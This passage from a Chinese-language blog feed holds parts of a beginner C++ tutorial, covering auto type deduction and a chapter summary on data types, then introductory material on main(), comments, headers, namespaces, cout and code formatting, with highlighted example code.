class="meta-string">&lt;vector&gt; // 包含 vector</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;typeinfo&gt; // 用于 typeid (仅作演示)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 基本类型推断</span></span><br><span class="line">    <span class="keyword">auto</span> i = <span class="number">10</span>;       <span class="comment">// i 被推断为 int</span></span><br><span class="line">    <span class="keyword">auto</span> d = <span class="number">3.14</span>;     <span class="comment">// d 被推断为 double</span></span><br><span class="line">    <span class="keyword">auto</span> f = <span class="number">3.14f</span>;    <span class="comment">// f 被推断为 float</span></span><br><span class="line">    <span class="keyword">auto</span> c = <span class="string">&#x27;A&#x27;</span>;      <span class="comment">// c 被推断为 char</span></span><br><span class="line">    <span class="keyword">auto</span> b = <span class="literal">true</span>;     <span class="comment">// b 被推断为 bool</span></span><br><span class="line">    <span class="keyword">auto</span> ll = <span class="number">1234567890L</span>L; <span class="comment">// ll 被推断为 long long</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of i: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(i).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of d: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(d).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of f: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(f).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of ll: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(ll).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 推断表达式结果类型</span></span><br><span class="line">    <span class="keyword">auto</span> sum = i + d; <span class="comment">// i(int) + d(double) -&gt; double, sum 被推断为 double</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of sum: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(sum).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;sum = &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 推断 const 和引用 (需要显式添加)</span></span><br><span class="line">    <span class="keyword">int</span> original = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">auto</span> copy = original;         <span class="comment">// copy 是 int (非引用, 非 const)</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">auto</span> const_copy = original; <span class="comment">// const_copy 是 const int</span></span><br><span class="line">    <span class="keyword">auto</span>&amp; ref = original;         <span class="comment">// ref 是 int&amp; (引用)</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">auto</span>&amp; const_ref = original; <span class="comment">// const_ref 是 const int&amp; (const 引用)</span></span><br><span class="line"></span><br><span class="line">    copy = <span class="number">200</span>; <span class="comment">// OK</span></span><br><span class="line">    <span class="comment">// const_copy = 200; // 错误! const_copy 是 const</span></span><br><span class="line">    ref = <span class="number">300</span>; <span class="comment">// OK, original 也变为 300</span></span><br><span class="line">    <span class="comment">// const_ref = 400; // 错误! const_ref 是 const 引用</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;original: &quot;</span> &lt;&lt; original &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 输出 300</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 用于复杂类型 (例如 STL 容器迭代器)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::<span class="built_in">string</span>&gt; names = &#123;<span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Charlie&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">auto</span> it = names.begin(); <span class="comment">// it 被推断为 std::vector&lt;std::string&gt;::iterator</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;First name: &quot;</span> &lt;&lt; *it &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of it: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(it).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// C++11 列表初始化</span></span><br><span class="line">    <span class="keyword">auto</span> list1 = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>&#125;; <span class="comment">// list1 是 std::initializer_list&lt;int&gt;</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Type of list1: &quot;</span> &lt;&lt; <span class="keyword">typeid</span>(list1).name() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// C++17 列表初始化 (无等号)</span></span><br><span class="line">    <span class="comment">// auto val&#123;42&#125;; // C++17: val 是 int</span></span><br><span class="line">    <span class="comment">// std::cout &lt;&lt; &quot;Type of val: &quot; &lt;&lt; typeid(val).name() &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>优点:</strong></p><ul><li>  减少冗余代码，尤其是在类型名称很长时。</li><li>  提高代码的可维护性，如果初始化表达式的类型改变，<code>auto</code> 变量的类型会自动更新。</li><li>  有助于泛型编程。</li></ul><p><strong>缺点/注意事项:</strong></p><ul><li>  过度使用可能降低代码的可读性，因为读者需要查看初始化表达式才能确定类型。</li><li>  <code>auto</code> 推断出的类型可能不是你期望的（例如，忘记添加 <code>&amp;</code> 得到副本而不是引用）。</li><li>  对于代理类（Proxy Classes），<code>auto</code> 可能推断出代理类型而不是期望的值类型，需要小心。</li></ul><p><strong>建议:</strong> 在类型冗长、明显或无关紧要时使用 <code>auto</code> 可以提高效率。在类型对于理解代码逻辑很重要时，显式写出类型可能更好。</p><h2 id="3-5-总结"><a href="#3-5-总结" class="headerlink" title="3.5 总结"></a>3.5 总结</h2><p>本章深入探讨了C++用于处理数据的基本内置类型。我们首先学习了简单变量的命名规则和约定，强调了名称的可读性和合法性。</p><p>接着，我们详细研究了C++的<strong>整型家族</strong>，包括 <code>short</code>、<code>int</code>、<code>long</code> 和 C++11 新增的 <code>long long</code>。我们讨论了它们各自的大小、表示范围以及如何选择合适的类型。我们还介绍了 <code>unsigned</code> 类型，它们用于存储非负整数，并具有更大的正数范围。我们学习了如何书写不同进制（十进制、八进制、十六进制，以及C++14的二进制）的整型字面值，以及如何使用后缀（<code>U</code>, <code>L</code>, <code>LL</code>）来指定常量的具体类型，并了解了编译器在没有后缀时如何推断常量类型。</p><p><code>char</code> 类型被介绍为一种特殊的整型，主要用于存储字符，但也可以作为小整数使用。我们学习了字符字面值（使用单引号）和转义序列。<code>bool</code> 类型也被引入，用于表示逻辑真 (<code>true</code>) 和假 (<code>false</code>)，以及它与整数（1和0）之间的转换关系。</p><p>为了创建不可修改的变量（常量），我们学习了 <code>const</code> 限定符。使用 <code>const</code> 定义的常量必须在声明时初始化，它提供了类型安全和作用域控制，是比 <code>#define</code> 更受推荐的常量定义方式。</p><p>然后，我们转向了<strong>浮点类型</strong> (<code>float</code>, <code>double</code>, <code>long double</code>)，用于表示带小数的数字。我们学习了书写浮点数的两种方式（标准小数点和E表示法），了解了不同浮点类型的精度和范围差异，以及如何使用后缀（<code>f</code>, <code>L</code>）指定浮点常量类型（默认为 <code>double</code>）。我们还讨论了浮点数的优点（范围广、表示小数）和固有的缺点（精度限制、比较困难）。</p><p>最后，我们学习了C++的<strong>基本算术运算符</strong> (<code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>%</code>)。我们探讨了运算符的优先级和结合性规则，以及如何使用括号来控制运算顺序。特别地，我们区分了整数除法（结果截断）和浮点数除法，并学习了求模运算符 <code>%</code> 的用法（主要用于整数求余）。</p><p><strong>类型转换</strong>是本章的另一个重点，包括编译器自动执行的隐式转换（如整型提升和算术转换）和程序员指定的显式转换（C风格转换和更安全的C++转换符 <code>static_cast</code>、<code>dynamic_cast</code>、<code>const_cast</code>、<code>reinterpret_cast</code>）。我们强调了转换中可能出现的信息丢失问题。</p><p>C++11 引入的 <code>auto</code> 关键字也被介绍，它允许编译器根据初始化表达式自动推断变量类型，简化了代码，尤其是在处理复杂类型时。</p><p>通过本章的学习，我们掌握了C++的基本数据类型及其用法，为后续更复杂的数据结构和算法打下了坚实的基础。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 2 开始学习C++</title>
      <link href="2025/04/26/Cpp_tutorial_Chapter_2/"/>
      <url>2025/04/26/Cpp_tutorial_Chapter_2/</url>
      
        <content type="html"><![CDATA[<h2 id="2-1-进入C"><a href="#2-1-进入C" class="headerlink" title="2.1 进入C++"></a>2.1 进入C++</h2><p>本节将引导你编写第一个C++程序，并介绍一些基本概念。</p><h3 id="2-1-1-main-函数"><a href="#2-1-1-main-函数" class="headerlink" title="2.1.1 main()函数"></a>2.1.1 main()函数</h3><p>每个C++程序都必须包含一个名为 <code>main</code> 的函数。操作系统通过调用 <code>main</code> 函数来启动C++程序。<code>main</code> 函数是程序的入口点。</p><p><strong>基本结构:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 程序代码</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 表示程序成功执行</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>int main()</code>: 这是 <code>main</code> 函数的函数头。<code>int</code> 表示 <code>main</code> 函数执行完毕后将返回一个整数值给操作系统。括号 <code>()</code> 表示这是一个函数。</li><li>  <code>&#123; ... &#125;</code>: 花括号标记了函数体的开始和结束。函数体包含了程序要执行的指令（语句）。</li><li>  <code>return 0;</code>: 这条语句表示 <code>main</code> 函数执行完毕。返回值 <code>0</code> 通常表示程序成功执行。非零返回值通常表示程序遇到了错误。</li></ul><p><strong>示例:</strong></p><p>一个最简单的C++程序：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个程序什么也不做，但它是一个完整的、可以编译和运行的C++程序。</p><h3 id="2-1-2-C-注释"><a href="#2-1-2-C-注释" class="headerlink" title="2.1.2 C++注释"></a>2.1.2 C++注释</h3><p>注释是程序中用于解释代码的部分，它们会被编译器忽略，不会影响程序的执行。注释可以提高代码的可读性。</p><p>C++支持两种类型的注释：</p><ol><li> <strong>单行注释:</strong> 以 <code>//</code> 开始，直到该行结束。</li><li> <strong>多行注释:</strong> 以 <code>/*</code> 开始，以 <code>*/</code> 结束，可以跨越多行。</li></ol><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; // 这是一个单行注释，解释包含头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">   这是一个多行注释。</span></span><br><span class="line"><span class="comment">   它可以用来写更长的解释。</span></span><br><span class="line"><span class="comment">   下面的 main 函数是程序的入口点。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 使用 cout 输出 &quot;Hello, World!&quot; 到控制台</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello, World!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// endl 用于换行</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 程序成功结束</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-1-3-C-预处理器和iostream文件"><a href="#2-1-3-C-预处理器和iostream文件" class="headerlink" title="2.1.3 C++预处理器和iostream文件"></a>2.1.3 C++预处理器和iostream文件</h3><p>在编译C++程序之前，<strong>预处理器</strong>会首先处理源代码。预处理器指令以 <code>#</code> 符号开头。</p><p><code>#include</code> 是一个常见的预处理器指令，它告诉预处理器将另一个文件的内容包含到当前文件中。</p><p><code>iostream</code> 文件是C++标准库的一部分，包含了进行输入（input）和输出（output）操作所需的信息。例如，要使用 <code>cout</code> 进行输出，就需要包含 <code>iostream</code> 文件。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; // 包含 iostream 文件，以便使用 cout</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello from iostream!&quot;</span>; </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>#include &lt;iostream&gt;</code>: 这条指令告诉预处理器查找名为 <code>iostream</code> 的标准头文件，并将其内容插入到该指令所在的位置。</li></ul><h3 id="2-1-4-头文件名"><a href="#2-1-4-头文件名" class="headerlink" title="2.1.4 头文件名"></a>2.1.4 头文件名</h3><p>头文件（Header Files）包含了函数、类、对象等的声明，使得我们可以在程序中使用它们。C++标准库提供了许多头文件。</p><ul><li>  <strong>标准库头文件:</strong> 通常使用尖括号 <code>&lt;&gt;</code> 括起来，例如 <code>&lt;iostream&gt;</code>, <code>&lt;cmath&gt;</code>, <code>&lt;string&gt;</code>。编译器会在标准库的包含路径中查找这些文件。</li><li>  <strong>用户自定义头文件:</strong> 通常使用双引号 <code>&quot;&quot;</code> 括起来，例如 <code>&quot;myheader.h&quot;</code>。编译器会首先在当前源文件所在的目录查找，然后在标准包含路径中查找。</li></ul><p><strong>C++98之前的头文件:</strong> 以前的C++头文件可能带有 <code>.h</code> 后缀（如 <code>&lt;iostream.h&gt;</code>）。现代C++（C++98及以后）推荐使用不带 <code>.h</code> 后缀的标准头文件（如 <code>&lt;iostream&gt;</code>），这些头文件的内容位于 <code>std</code> 命名空间中。</p><p><strong>示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; // 标准库头文件</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;    // 包含数学函数，如 sqrt()</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;myutils.h&quot;</span> <span class="comment">// 用户自定义头文件 (假设存在 myutils.h)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">double</span> num = <span class="number">9.0</span>;</span><br><span class="line">    <span class="keyword">double</span> root = <span class="built_in">std</span>::<span class="built_in">sqrt</span>(num); <span class="comment">// 使用 cmath 中的 sqrt 函数</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Square root of &quot;</span> &lt;&lt; num &lt;&lt; <span class="string">&quot; is &quot;</span> &lt;&lt; root &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 假设 myutils.h 中定义了 printMessage() 函数</span></span><br><span class="line">    <span class="comment">// printMessage(&quot;Using custom header!&quot;); </span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-1-5-名称空间"><a href="#2-1-5-名称空间" class="headerlink" title="2.1.5 名称空间"></a>2.1.5 名称空间</h3><p>名称空间（Namespace）是C++中避免命名冲突的一种机制。不同的名称空间可以包含同名的函数、类或变量。</p><p>标准C++库中的所有内容（如 <code>cout</code>, <code>cin</code>, <code>endl</code>, <code>string</code> 等）都定义在名为 <code>std</code> 的名称空间中。</p><p>要使用 <code>std</code> 名称空间中的元素，有几种方法：</p><ol><li><strong>使用作用域解析运算符 <code>::</code>:</strong> 在每个元素前加上 <code>std::</code>。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br></pre></td></tr></table></figure></li><li><strong>使用 <code>using</code> 声明:</strong> 将特定的名称引入当前作用域。 <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">cout</span>; <span class="comment">// 只引入 cout</span></span><br><span class="line"><span class="keyword">using</span> <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// 只引入 endl</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello!&quot;</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 不需要 std:: 前缀</span></span><br><span class="line">    <span class="comment">// std::cin &gt;&gt; variable; // 如果要用 cin，仍需 std:: 或 using std::cin;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><strong>使用 <code>using</code> 编译指令:</strong> 将整个名称空间的所有名称引入当前作用域。<strong>（不推荐在头文件中或全局作用域中使用，可能导致命名冲突）</strong> <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>; <span class="comment">// 引入 std 中的所有名称</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello!&quot;</span> &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 不需要 std:: 前缀</span></span><br><span class="line">    <span class="keyword">int</span> x;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; x; <span class="comment">// cin 也不需要 std:: 前缀</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p><strong>推荐做法:</strong></p><ul><li>  在 <code>.cpp</code> 文件的函数内部或较小作用域内，可以使用 <code>using</code> 声明或 <code>using namespace std;</code>。</li><li>  在头文件 (<code>.h</code>) 中，<strong>绝对不要</strong>使用 <code>using namespace std;</code>，应始终使用 <code>std::</code> 前缀。</li><li>  在简单的示例或小型项目中，<code>using namespace std;</code> 可以简化代码，但在大型项目中，坚持使用 <code>std::::</code> 或 <code>using</code> 声明是更安全的做法。</li></ul><h3 id="2-1-6-使用cout进行C-输出"><a href="#2-1-6-使用cout进行C-输出" class="headerlink" title="2.1.6 使用cout进行C++输出"></a>2.1.6 使用cout进行C++输出</h3><p><code>cout</code> 是 <code>iostream</code> 库中预定义的一个对象，代表标准输出流，通常连接到控制台（屏幕）。</p><p><code>&lt;&lt;</code> 运算符（插入运算符）用于将数据发送给 <code>cout</code> 对象，使其显示在屏幕上。</p><p><strong>用法与示例:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 输出字符串字面量</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Welcome to C++!&quot;</span>; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 输出换行符 (使用 std::endl)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 输出数字</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The year is &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="number">2024</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 链式输出</span></span><br><span class="line">    <span class="keyword">int</span> age = <span class="number">30</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;My age is: &quot;</span> &lt;&lt; age &lt;&lt; <span class="string">&quot; years old.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出特殊字符 (使用转义序列)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;This is a tab:\t.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;This is a newline:\n.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;This is a quote: \&quot; &quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;This is a backslash: \\&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>std::endl</code>: 是一个特殊的控制符（manipulator），它会输出一个换行符，并<strong>刷新输出缓冲区</strong>（确保内容立即显示）。</li><li>  <code>\n</code>: 是一个转义字符，代表换行符。它只输出换行，通常不保证立即刷新缓冲区。在多数情况下，<code>\n</code> 比 <code>std::endl</code> 效率稍高。</li></ul><h3 id="2-1-7-C-源代码的格式化"><a href="#2-1-7-C-源代码的格式化" class="headerlink" title="2.1.7 C++源代码的格式化"></a>2.1.7 C++源代码的格式化</h3><p>C++语言对代码格式（如空格、缩进、换行）的要求相对宽松，但良好的格式化对于代码的可读性和可维护性至关重要。</p><p><strong>基本规则和建议:</strong></p><ul><li>  <strong>语句分隔:</strong> C++使用分号 <code>;</code> 来结束大多数语句。</li><li><strong>空格:</strong><ul><li>  通常在运算符（<code>=</code>, <code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>, <code>&lt;&lt;</code>, <code>&gt;&gt;</code>, <code>==</code> 等）两边添加空格。</li><li>  在逗号 <code>,</code> 后面添加空格。</li><li>  在函数名和后面的括号 <code>()</code> 之间通常不加空格。</li></ul></li><li>  <strong>缩进:</strong> 使用一致的缩进（通常是4个空格或一个制表符）来表示代码块（如 <code>main</code> 函数体、循环体、条件语句体）。这极大地提高了代码结构的可读性。</li><li><strong>换行:</strong><ul><li>  通常每行只写一条语句。</li><li>  可以在合适的地方（如运算符之后、逗号之后）将长语句分成多行。</li></ul></li><li>  <strong>花括号 <code>&#123;&#125;</code>:</strong> 对于代码块（如函数体、<code>if</code> 语句块等），花括号的放置风格有多种（如 K&amp;R 风格、Allman 风格），选择一种并保持一致即可。</li></ul><p><strong>示例 (良好格式):</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; <span class="comment">// 左花括号通常独占一行或在行尾</span></span><br><span class="line">    <span class="keyword">int</span> score = <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Initial score: &quot;</span> &lt;&lt; score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (score &gt; <span class="number">90</span>) </span><br><span class="line">    &#123; <span class="comment">// 缩进表示 if 块内部</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Excellent!&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        score = score + <span class="number">5</span>; <span class="comment">// 在运算符两边加空格</span></span><br><span class="line">    &#125; <span class="comment">// 右花括号通常独占一行，与对应块的起始对齐</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Final score: &quot;</span> &lt;&lt; score &lt;&lt; <span 